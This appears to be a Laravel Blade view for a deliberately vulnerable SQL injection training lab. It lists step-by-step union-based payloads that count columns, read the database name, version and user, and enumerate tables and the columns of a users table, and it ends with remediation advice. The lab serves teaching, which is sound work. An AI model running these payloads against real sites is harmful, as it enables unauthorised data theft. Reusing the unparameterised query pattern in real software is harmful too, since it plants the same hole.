@extends('layouts.app')
@section('title', 'Union-based SQLi Lab')

@section('content')
<div class="max-w-5xl mx-auto space-y-6">
    <div>
        <h1 class="text-3xl font-bold text-gray-800">Union-based SQL Injection Lab</h1>
        <p class="text-gray-500 mt-1">Scenario: view product detail by id, then exploit UNION SELECT to read database metadata.</p>
    </div>

    <div class="bg-white rounded-xl shadow p-6 border border-red-100">
        <h2 class="text-lg font-semibold text-red-700 mb-4">Product Detail Endpoint</h2>
        <p class="text-sm text-gray-600 mb-3">Vulnerable endpoint: <span class="font-mono">/product/detail?id=...</span></p>

        <form method="GET" action="/product/detail" class="space-y-3">
            <label class="block text-sm font-medium text-gray-700">Input for query parameter <span class="font-mono">id</span></label>
            <input
                type="text"
                name="id"
                value="{{ $id ?? '1' }}"
                class="w-full border rounded-lg px-3 py-2 font-mono text-sm focus:outline-none focus:ring-2 focus:ring-red-400"
                placeholder="1"
            >
            <button class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg transition">View Product</button>
        </form>

        <div class="mt-4 bg-gray-50 border rounded-lg p-3 text-xs text-gray-700">
            Controller executes SQL pattern: <span class="font-mono">SELECT id, name, description, price FROM products WHERE id = &lt;id&gt; LIMIT 1</span>
        </div>
    </div>

    <div class="bg-white rounded-xl shadow p-6 border border-gray-100 space-y-4">
        <h3 class="text-base font-semibold text-gray-800">Union-based attack script</h3>

        <div>
            <p class="text-sm font-semibold text-gray-700 mb-2">1) Baseline product detail</p>
            <div class="space-y-2 text-xs font-mono">
                <div class="bg-gray-50 border rounded p-2 break-all">/product/detail?id=1</div>
                <div class="bg-gray-50 border rounded p-2 break-all">/product/detail?id=2</div>
            </div>
        </div>

        <div>
            <p class="text-sm font-semibold text-gray-700 mb-2">2) Identify column count (example with ORDER BY)</p>
            <div class="space-y-2 text-xs font-mono">
                <div class="bg-gray-50 border rounded p-2 break-all">/product/detail?id=1 ORDER BY 1-- </div>
                <div class="bg-gray-50 border rounded p-2 break-all">/product/detail?id=1 ORDER BY 2-- </div>
                <div class="bg-gray-50 border rounded p-2 break-all">/product/detail?id=1 ORDER BY 3-- </div>
                <div class="bg-gray-50 border rounded p-2 break-all">/product/detail?id=1 ORDER BY 4-- </div>
            </div>
        </div>

        <div>
            <p class="text-sm font-semibold text-gray-700 mb-2">3) UNION SELECT to exfiltrate DB info</p>
            <div class="space-y-2 text-xs font-mono">
                <div class="bg-gray-50 border rounded p-2 break-all">/product/detail?id=-1 UNION SELECT 1,database(),'lab-desc',999-- </div>
                <div class="bg-gray-50 border rounded p-2 break-all">/product/detail?id=-1 UNION SELECT 1,version(),'lab-desc',999-- </div>
                <div class="bg-gray-50 border rounded p-2 break-all">/product/detail?id=-1 UNION SELECT 1,user(),'lab-desc',999-- </div>
            </div>
        </div>

        <div>
            <p class="text-sm font-semibold text-gray-700 mb-2">4) Enumerate schema and table names</p>
            <div class="space-y-2 text-xs font-mono">
                <div class="bg-gray-50 border rounded p-2 break-all">/product/detail?id=-1 UNION SELECT 1,table_name,'from_info_schema',999 FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1-- </div>
                <div class="bg-gray-50 border rounded p-2 break-all">/product/detail?id=-1 UNION SELECT 1,table_name,'from_info_schema',999 FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1-- </div>
                <div class="bg-gray-50 border rounded p-2 break-all">/product/detail?id=-1 UNION SELECT 1,column_name,'from_info_schema',999 FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1-- </div>
            </div>
        </div>
    </div>

    @isset($sql)
        <div class="bg-white rounded-xl shadow p-6 border border-gray-100 space-y-3">
            <h3 class="text-base font-semibold text-gray-800">Execution Result</h3>
            <div class="bg-gray-900 text-green-300 rounded-lg p-3 font-mono text-xs overflow-x-auto">{{ $sql }}</div>

            @if($dbError)
                <div class="bg-red-50 text-red-700 border border-red-200 rounded-lg p-3 text-sm">
                    Database error: {{ $dbError }}
                </div>
            @else
                <div class="text-sm">
                    @if(($messageType ?? '') === 'success')
                        <span class="inline-flex items-center px-3 py-1 rounded-full bg-green-100 text-green-700 font-medium">CO</span>
                    @else
                        <span class="inline-flex items-center px-3 py-1 rounded-full bg-red-100 text-red-700 font-medium">KHONG</span>
                    @endif
                </div>

                @if(!empty($rows))
                    <div class="overflow-x-auto">
                        <table class="min-w-full text-sm border border-gray-200 rounded-lg overflow-hidden">
                            <thead class="bg-gray-100 text-gray-700">
                                <tr>
                                    <th class="px-3 py-2 text-left">id</th>
                                    <th class="px-3 py-2 text-left">name</th>
                                    <th class="px-3 py-2 text-left">description</th>
                                    <th class="px-3 py-2 text-left">price</th>
                                </tr>
                            </thead>
                            <tbody>
                                @foreach($rows as $row)
                                    <tr class="border-t border-gray-200">
                                        <td class="px-3 py-2">{{ $row->id ?? '' }}</td>
                                        <td class="px-3 py-2">{{ $row->name ?? '' }}</td>
                                        <td class="px-3 py-2">{{ $row->description ?? '' }}</td>
                                        <td class="px-3 py-2">{{ $row->price ?? '' }}</td>
                                    </tr>
                                @endforeach
                            </tbody>
                        </table>
                    </div>
                @endif
            @endif
        </div>
    @endisset

    <div class="bg-amber-50 border border-amber-200 rounded-xl p-5 text-sm text-amber-900">
        <p class="font-semibold mb-1">Fix guidance (for remediation phase)</p>
        <p>Use prepared statements for id, strict numeric validation, and avoid returning raw DB errors to clients.</p>
    </div>
</div>
@endsection
